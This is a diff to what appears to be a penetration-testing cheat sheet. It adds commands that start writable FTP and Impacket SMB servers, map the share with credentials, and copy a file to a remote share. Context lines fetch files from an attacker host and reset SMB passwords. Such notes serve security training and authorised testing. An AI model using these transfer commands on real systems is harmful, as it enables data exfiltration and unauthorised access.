@@ -593,6 +593,7 @@ __curl http://<LHOST>/<FILE> > <OUTPUT_FILE>
 ftp <RHOST>
 ftp -A <RHOST>
 wget -r ftp://anonymous:anonymous@<RHOST>
+python -m pyftpdlib -p 21 -w	// To start the ftp server on port 21
 ```
 
 #### Kerberos
@@ -5411,6 +5412,9 @@ impacket-smbpasswd <RHOST>/<USERNAME>:<PASSWORD>@<RHOST> -newpass <PASSWORD>
 ```shell
 impacket-smbserver share . -smb2support
 impacket-smbserver -smb2support share <FOLDER> -user <USERNAME> -password <PASSWORD>
+impacket-smbserver share $(pwd) -smb2support -username <USERNAME> -password <PASSWORD>	// To start the SMB Server on current folder
+net use \\192.168.45.245\share /user:<USERNAME> <PASSWORD>	// To use the SMB server with the credential
+copy ignite.txt \\192.168.31.141\share\ignite.txt
 ```
 
 ##### impacket-ticketer
